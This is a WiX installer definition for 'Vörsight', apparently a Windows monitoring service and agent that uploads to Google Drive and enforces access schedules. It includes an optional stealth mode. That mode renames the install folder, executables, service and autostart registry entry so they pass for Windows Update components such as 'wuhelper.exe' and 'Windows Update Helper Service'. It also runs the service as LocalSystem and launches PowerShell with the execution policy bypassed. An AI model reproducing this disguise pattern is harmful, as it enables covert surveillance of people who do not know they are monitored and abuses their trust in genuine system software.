<Wix xmlns="http://wixtoolset.org/schemas/v4/wxs" xmlns:ui="http://wixtoolset.org/schemas/v4/wxs/ui">
  <Package Name="Vörsight" Manufacturer="Vörsight" Version="1.0.0.0" UpgradeCode="a2b3c4d5-e6f7-8901-2345-6789abcdef01">
    <MajorUpgrade DowngradeErrorMessage="A newer version of [ProductName] is already installed." />
    <MediaTemplate EmbedCab="yes" />

    <StandardDirectory Id="ProgramFiles64Folder">
      <Directory Id="INSTALLFOLDER" Name="!(bind.property.APPFOLDER_NAME)">
        <Directory Id="DRIVECREDENTIALSFOLDER" Name="DriveCredentials" />
      </Directory>
    </StandardDirectory>

    <Feature Id="Main" Title="Vörsight" Description="Monitoring Service and Agent" Level="1">
      <ComponentGroupRef Id="ServiceComponents" />
      <ComponentGroupRef Id="AgentComponents" />
      <ComponentRef Id="DriveCredentialsFolder" />
    </Feature>
    
    <!-- Properties -->
    <Property Id="USE_STEALTH_MODE" Value="0" />
    <Property Id="OAUTH_JSON" Secure="yes" Hidden="yes" />
    
    <!-- Default naming (normal mode) -->
    <Property Id="APPFOLDER_NAME" Value="Vörsight" />
    <Property Id="SERVICE_EXE_NAME" Value="Vorsight.Service.exe" />
    <Property Id="AGENT_EXE_NAME" Value="Vorsight.Agent.exe" />
    <Property Id="SERVICE_NAME" Value="VorsightService" />
    <Property Id="SERVICE_DISPLAY_NAME" Value="Vorsight Monitoring Service" />
    <Property Id="SERVICE_DESCRIPTION" Value="Monitors system usage and enforces access schedules." />
    <Property Id="AGENT_REGISTRY_NAME" Value="VorsightAgent" />
    
    <!-- Stealth mode overrides -->
    <SetProperty Id="APPFOLDER_NAME" Value="Windows Update Helper" Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
    <SetProperty Id="SERVICE_EXE_NAME" Value="WindowsUpdateService.exe" Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
    <SetProperty Id="AGENT_EXE_NAME" Value="wuhelper.exe" Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
    <SetProperty Id="SERVICE_NAME" Value="WUHelperService" Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
    <SetProperty Id="SERVICE_DISPLAY_NAME" Value="Windows Update Helper Service" Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
    <SetProperty Id="SERVICE_DESCRIPTION" Value="Provides background update checking and system health monitoring." Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
    <SetProperty Id="AGENT_REGISTRY_NAME" Value="WindowsUpdateHelper" Before="CostFinalize" Sequence="first" Condition="USE_STEALTH_MODE" />
    
    <!-- UI Configuration -->
    <ui:WixUI Id="WixUI_InstallDir" InstallDirectory="INSTALLFOLDER" />
    
    <!-- Insert custom dialogs into install flow -->
    <UI>
      <Publish Dialog="InstallDirDlg" Control="Next" Event="NewDialog" Value="ConfigDialog" Order="3" Condition="1" />
    </UI>
  </Package>

  <Fragment>
    <ComponentGroup Id="ServiceComponents" Directory="INSTALLFOLDER">
      <Component Id="VorsightServiceComponent" Guid="*" Bitness="always64">
        <File Id="VorsightServiceExe" Source="..\Vorsight.Service\bin\Release\net10.0\win-x64\publish\Vorsight.Service.exe" Name="[SERVICE_EXE_NAME]" KeyPath="yes" />
        <ServiceInstall Id="ServiceInstaller"
                        Type="ownProcess"
                        Name="[SERVICE_NAME]"
                        DisplayName="[SERVICE_DISPLAY_NAME]"
                        Description="[SERVICE_DESCRIPTION]"
                        Start="auto"
                        Account="LocalSystem"
                        ErrorControl="normal" />
        <ServiceControl Id="StartService" Start="install" Stop="both" Remove="uninstall" Name="[SERVICE_NAME]" Wait="yes" />
      </Component>

      <Component Id="ServiceConfigComponent" Guid="*" Bitness="always64">
        <File Id="ServiceConfig" Source="..\Vorsight.Service\appsettings.json" />
      </Component>
      
      <Component Id="OAuthScriptComponent" Guid="*" Bitness="always64">
        <File Id="OAuthScript" Source="ConfigureGoogleDrive.ps1" />
      </Component>
    </ComponentGroup>

    <ComponentGroup Id="AgentComponents" Directory="INSTALLFOLDER">
      <Component Id="VorsightAgentComponent" Guid="*" Bitness="always64">
        <File Id="VorsightAgentExe" Source="..\Vorsight.Agent\bin\Release\net10.0-windows\win-x64\publish\Vorsight.Agent.exe" Name="[AGENT_EXE_NAME]" KeyPath="yes" />
        <RegistryValue Root="HKLM" Key="Software\Microsoft\Windows\CurrentVersion\Run" Name="[AGENT_REGISTRY_NAME]" Type="string" Value="[INSTALLFOLDER][AGENT_EXE_NAME]" />
      </Component>
    </ComponentGroup>
    
    <Component Id="DriveCredentialsFolder" Guid="{B7C2E5F8-3A4D-41B9-8C7E-9D3F2A1B4E6C}" Directory="DRIVECREDENTIALSFOLDER" Bitness="always64">
      <CreateFolder>
        <util:PermissionEx xmlns:util="http://wixtoolset.org/schemas/v4/wxs/util" User="[WIX_ACCOUNT_LOCALSYSTEM]" GenericAll="yes" />
      </CreateFolder>
      <RemoveFolder Id="RemoveDriveCredentialsFolder" On="uninstall" />
      <RegistryValue Root="HKCU" Key="Software\Vorsight" Name="DriveCredentialsInstalled" Type="integer" Value="1" KeyPath="yes" />
    </Component>
    
    <!-- PowerShell OAuth configuration - passes OAUTH_JSON directly to script -->
    <CustomAction Id="ConfigureGoogleDrive" 
                  Directory="INSTALLFOLDER"
                  ExeCommand='cmd.exe /c "echo [OAUTH_JSON] &gt; oauth.json &amp;&amp; powershell.exe -ExecutionPolicy Bypass -File ConfigureGoogleDrive.ps1 -InstallDir &quot;[INSTALLFOLDER]&quot;"'
                  Execute="deferred"
                  Impersonate="yes"
                  Return="ignore" />
    
    <InstallExecuteSequence>
      <Custom Action="ConfigureGoogleDrive" After="InstallFiles" Condition="NOT Installed AND OAUTH_JSON" />
    </InstallExecuteSequence>
  </Fragment>

</Wix>
